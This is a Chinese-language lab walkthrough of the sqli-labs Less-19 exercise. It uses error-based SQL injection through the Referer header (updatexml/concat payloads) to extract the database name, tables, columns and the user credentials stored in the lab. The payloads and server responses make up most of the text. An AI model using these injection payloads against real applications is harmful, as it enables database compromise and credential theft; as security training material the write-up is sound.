## 1.测试闭合符

输入：Referer:[ **http://192.168.43.104/sqli-labs/Less-19/**](http://192.168.43.104/sqli-labs/Less-19/) **'**

输出错误信息：Your Referer is: <http://192.168.43.104/sqli-labs/Less-19/>'</font><br>You have an error in your SQL syntax; check the
manual that corresponds to your MariaDB server version for the right syntax to
use near '192.168.43.106')' at line 1

 **从输出的错误信息可知，sql指令将我的输入带到数据库中进行了查询，表示该处存在注入点。**

输入：Referer:[ **http://192.168.43.104/sqli-labs/Less-19/**](http://192.168.43.104/sqli-labs/Less-19/) **"**

输出：<br>Your IP ADDRESS is: 192.168.43.106<br><font color= "#FFFF00" font size
= 3 ></font><font color= "#0000ff" font size = 3 >Your Referer is:
<http://192.168.43.104/sqli-labs/Less-19/>"

 **没有报错信息输出，表示该sql指令的闭合符为'**

## 2.爆出库名

sql指令：[ **http://192.168.43.104/sqli-labs/Less-19/**](http://192.168.43.104/sqli-labs/Less-19/) **' or
updatexml(1,concat(0x7e,database(),0x7e),1) or '**

输出信息：

<br>Your IP ADDRESS is: 192.168.43.106<br><font color= "#FFFF00" font size = 3
></font><font color= "#0000ff" font size = 3 >Your Referer is:
<http://192.168.43.104/sqli-labs/Less-19/>' or
updatexml(1,concat(0x7e,database(),0x7e),1) or '</font><br>XPATH syntax error:
**'~security~**

原理：updatexml(XML_document,XPath_string,new_value)报错注入

 **可见该数据库名为security**

## 3.爆出表名

sql语句：

Referer:[ **http://192.168.43.104/sqli-labs/Less-19/**](http://192.168.43.104/sqli-labs/Less-19/) **' or
updatexml(1,concat('~',(select group_concat(table_name) from
information_schema.tables where table_schema='security')),1) or '**

输出：

<br>Your IP ADDRESS is: 192.168.43.106<br><font color= "#FFFF00" font size = 3
></font><font color= "#0000ff" font size = 3 >Your Referer is:
<http://192.168.43.104/sqli-labs/Less-19/>' or updatexml(1,concat('~',(select
group_concat(table_name) from information_schema.tables where
table_schema='security')),1) or '</font><br>XPATH syntax error: '
**~emails,referers,uagents,users'** <br><br><img src="../images/flag.jpg"
/><br>

 **可见表有：**

 **emails**

 **referers**

 **uagents**

 **users**

## 4.爆出表的字段名

sql指令：[ **http://192.168.43.104/sqli-labs/Less-19/**](http://192.168.43.104/sqli-labs/Less-19/) **' or
updatexml(1,concat(0x7e,(select group_concat(column_name) from
information_schema.columns where table_schema='security' and
table_name='users'),0x7e),1) or '**

输出信息：our IP ADDRESS is: 192.168.43.106<br><font color= "#FFFF00" font size = 3
></font><font color= "#0000ff" font size = 3 >Your Referer is:
<http://192.168.43.104/sqli-labs/Less-19/>' or updatexml(1,concat(0x7e,(select
group_concat(column_name) from information_schema.columns where
table_schema='security' and table_name='users'),0x7e),1) or '</font><br>XPATH
syntax error: ' **~id,username,password** ~'<br><br><img
src="../images/flag.jpg" /><br>

 **可见users表的字段为id,username,password**

## 5.爆出内容

输入： <http://192.168.43.104/sqli-labs/Less-19/>' and
updatexml(1,concat(0x7e,(select group_concat(username,':',password) from
users)),1) and '

输出：br>Your IP ADDRESS is: 192.168.43.106<br><font color= "#FFFF00" font size =
3 ></font><font color= "#0000ff" font size = 3 >Your Referer is:
<http://192.168.43.104/sqli-labs/Less-19/>' and
updatexml(1,concat(0x7e,(select group_concat(username,':',password) from
users)),1) and '</font><br>XPATH syntax error: ' **~Dumb:Dumb,Angelina:I-kill-you,D** '<br><br><img src="../images/flag.jpg" /><br>

只爆出来了两条记录，爆出不全

输入： <http://192.168.43.104/sqli-labs/Less-19/>' and
updatexml(1,concat(0x7e,(select group_concat(username,':',password) from users
where username not in ('Dumb','Angelina'))),1) and '

输出：

XPATH syntax error: '~ **Dummy:p@ssword,secure:crappy,st'**

继续在not in后面添加需要过滤的条件继续爆出剩余的记录即可。

![](https://image.3001.net/images/20210306/1615020484_604341c448c1560aa89a2.jpg!small)

